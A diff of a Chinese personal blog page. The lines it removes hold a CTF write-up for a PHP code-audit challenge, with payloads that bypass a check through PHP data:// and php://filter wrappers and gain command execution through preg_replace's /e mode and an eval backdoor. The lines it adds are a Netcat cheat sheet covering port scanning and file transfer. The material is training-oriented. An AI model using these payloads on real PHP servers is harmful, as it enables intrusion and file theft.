@@ -14,12 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="记一道简单的php代码审计题.
-​    ">
+  <meta name="description" content="本篇博客主要记录 Netcat 工具的常见使用.以方便后续使用的查询和记忆.">
   <meta name="author" content="Noel">
   <meta name="keywords" content="">
   
-  <title>BJDCTF2020ZJCTF，不过如此 - Noel&#39;s Blog</title>
+  <title>Netcat - Noel&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -164,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BJDCTF2020ZJCTF，不过如此">
+            <span class="h2" id="subtitle" title="Netcat">
               
             </span>
 
@@ -174,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-07-24 04:34" pubdate>
-        2021年7月24日 凌晨
+      <time datetime="2021-08-24 06:19" pubdate>
+        2021年8月24日 早上
       </time>
     </span>
   
@@ -186,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      604 字
+      478 字
     </span>
   
 
@@ -196,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      6
        分钟
     </span>
   
@@ -234,67 +233,50 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BJDCTF2020ZJCTF，不过如此</h1>
+            <h1 style="display: none">Netcat</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：1 个月前
+                  本文最后更新于：1 分钟前
                 
               </p>
             
             <div class="markdown-body">
-              <p>记一道简单的php代码审计题.</p>
-<p>​    </p>
+              <p>本篇博客主要记录 <code>Netcat</code> 工具的常见使用.以方便后续使用的查询和记忆.</p>
 <span id="more"></span>
 
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>打开题目链接直接看到源码</p>
-<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724051537700.png" srcset="/img/loading.gif" lazyload alt="image-20210724051537700"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><p>绕过第一个条件<code>file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;</code>的方法:</p>
-<ol>
-<li>php伪协议<code>data://</code></li>
-</ol>
-<p>构造payload如下:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=data:<span class="hljs-comment">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span><br></code></pre></td></tr></table></figure>
 
-<p>其中 <code>SSBoYXZlIGEgZHJlYW0=</code>为 “I have a dream” 的  <code>base64</code>编码</p>
-<ol start="2">
-<li>php为协议 <code>php://input</code></li>
-</ol>
-<p>构造payload如下:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=php:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。使用netcat命令所能完成的事情令人惊讶</p>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h3 id="Port-Scanning-端口扫描"><a href="#Port-Scanning-端口扫描" class="headerlink" title="Port Scanning 端口扫描"></a>Port Scanning 端口扫描</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># nc -z -v ipaddress port</span><br><span class="hljs-comment"># example</span><br><span class="hljs-attribute">nc</span> -z -v <span class="hljs-number">10.10.8.0</span> <span class="hljs-number">20</span>-<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
 
-<p>再使用hackbar传入<code>post</code>内容 <code>I have a dream</code></p>
-<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724052228758.png" srcset="/img/loading.gif" lazyload alt="image-20210724052228758"></p>
-<p>绕过<code>if</code>条件之后,根据提示,使用<code>php://filter</code>读取<code>next.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=next.php</span><br></code></pre></td></tr></table></figure>
+<p><code>-z</code> 选项告诉 <code>nc</code> 仅仅扫描开放的端口,并没有主动数据交互.</p>
+<p><code>-v</code> 选项将显示提供更多的信息.</p>
+<p><code>-u</code> 该选项将告诉<code>nc</code>使用 UDP 去做扫描</p>
+<h3 id="Sending-Files-文件传输"><a href="#Sending-Files-文件传输" class="headerlink" title="Sending Files 文件传输"></a>Sending Files 文件传输</h3><p>Netcat 还能通过创建 c/s 架构传输数据到另一主机.</p>
+<p>接收端(客户端)可以使用以下命令开启端口监听以等待连接,并且输出重定向到一个文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l <span class="hljs-number">5555</span>  &gt; file_name<br></code></pre></td></tr></table></figure>
 
-<p>完整padyload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=data:<span class="hljs-comment">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></code></pre></td></tr></table></figure>
+<p><code>-l</code> 选项用于开启监听 后面跟上监听的端口号</p>
+<p>发送端(服务端)使用以下命令向接收端(客户端)发送文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># nc client_ip_add client_port &lt; file_name</span><br><span class="hljs-comment"># 假设上面开启nc服务的主机ip为 192.168.0.10</span><br><br><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.0.10</span> <span class="hljs-number">5555</span> &lt; file_name<br></code></pre></td></tr></table></figure>
 
-<p>得到</p>
-<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724055034295.png" srcset="/img/loading.gif" lazyload alt="image-20210724055034295"></p>
-<p>解码一下,得到<code>next.php</code>的源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure>
 
-<p>很简单的一个代码审计,漏洞函数为<code>preg_replace</code>的<code>/e</code>模式,和<code>Tinkphp2.x</code>一样的洞</p>
-<p>直接构造正则<code>.*=$&#123;phpinfo())</code>,发现不行,通过师傅们的博客了解到<code>.</code>在传入时被php解析成了<code>_</code></p>
-<p>大佬们的payload为:<code>\S*=$&#123;phpinfo()&#125;</code>,传入,能够打通.</p>
-<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724055802035.png" srcset="/img/loading.gif" lazyload alt="image-20210724055802035"></p>
-<p>直接构造payload调用<code>getFlag()</code>执行<code>eval函数</code></p>
-<p>payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//858ccbf7-57c7-4eee-9e0f-74366c2a1aea.node4.buuoj.cn/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;ls /&#x27;);</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724060110550.png" srcset="/img/loading.gif" lazyload alt="image-20210724060110550"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//858ccbf7-57c7-4eee-9e0f-74366c2a1aea.node4.buuoj.cn/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></code></pre></td></tr></table></figure>
+<h3 id="Performing-an-HTTP-Request-发送Http请求"><a href="#Performing-an-HTTP-Request-发送Http请求" class="headerlink" title="Performing an HTTP Request  发送Http请求"></a>Performing an HTTP Request  发送Http请求</h3><p>由于存在更好的执行HTTP request 工具 <code>curl</code>,这里只对<code>nc</code>的这项功能做简单说明</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">printf <span class="hljs-string">&quot;GET /nc.1 HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: man.openbsd.org<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span> <span class="hljs-operator">|</span> nc man.openbsd.org <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724060132971.png" srcset="/img/loading.gif" lazyload alt="image-20210724060132971"></p>
-<p>拿到flag</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>算是一道比较简单的php代码审计题.本题利用较多的还是 <code>php伪协议</code>,从开始的<code>data://</code>绕过<code>if判断</code>,在到后面的<code>php://filter</code>读取文件源码.且此类型的题目的<code>php伪协议</code>利用手法较为常规,还不熟悉的师傅可以多看看.</p>
-<p>除此之外,另一个知识点就是关于<code>preg_replace</code>的代码执漏洞,这个漏洞函数比较常见,且影响范围也广,包括<code>Thinkphp2.x</code>,<code>phpMyadmin</code>以及一些cms.</p>
-<p>过后也会单独出一篇Blog来记录php代码审计中的常用函数</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/145646.htm">https://www.jb51.net/article/145646.htm</a>    </p>
+<p>用于从OpenBSD网站上检索Netcat手册页面</p>
+<h3 id="More-Example"><a href="#More-Example" class="headerlink" title="More Example"></a>More Example</h3><ul>
+<li>使用本地的 <code>31337</code> 端口去连接 <code>host.example.com</code> 的<code>42</code> 端口</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -p <span class="hljs-number">31337</span> -w <span class="hljs-number">5</span> host.example.com <span class="hljs-number">42</span><br></code></pre></td></tr></table></figure>
+
+<p><code>-w</code>: 设置超时连接时长</p>
+<ul>
+<li>(假设你的电脑存在多个网卡,也就是存在多个ip) 使用<code>10.1.2.3</code> 作为源地址去连接<code>host.example.com</code> 的<code>42</code>端口</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -s <span class="hljs-number">10.1.2.3</span> host.example.com <span class="hljs-number">42</span><br></code></pre></td></tr></table></figure>
 
             </div>
             <hr>
@@ -304,7 +286,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>
+                      <a class="hover-with-bg" href="/categories/Tools/">Tools</a>
                     
                   </div>
                 
@@ -312,9 +294,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/php/">php</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                      <a class="hover-with-bg" href="/tags/Netcat/">Netcat</a>
                     
                   </div>
                 
@@ -331,18 +311,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/07/26/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">网鼎杯2020朱雀组phpweb</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/23/GWCTF2019%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/">
-                        <span class="hidden-mobile">GWCTF2019我有一个数据库</span>
+                      <a href="/2021/08/15/nodejs-summary/">
+                        <span class="hidden-mobile">Nodejs Summary</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
